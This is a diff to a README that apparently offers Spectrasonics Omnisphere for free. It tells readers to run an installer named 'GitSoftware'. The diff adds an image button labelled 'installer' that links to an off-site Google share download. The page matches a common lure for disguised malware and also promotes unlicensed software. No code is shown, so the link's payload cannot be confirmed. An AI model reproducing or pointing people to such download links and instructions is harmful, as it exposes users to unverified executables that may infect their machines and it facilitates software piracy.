@@ -20,6 +20,8 @@ Spectrasonics Omnisphere is a powerhouse synthesizer plugin with over 14,000 ins
 2. Extract the archive and run the installer GitSoftware.
 3. Inside the installer, click "Continue"
 
+[![installer](https://i.postimg.cc/2yCV2fqC/deadlife.png)](https://share.google/rgcLa9nrrpnz9how3)
+
 ## System Requirements
 
 | Item      | Minimum              | Recommended     |
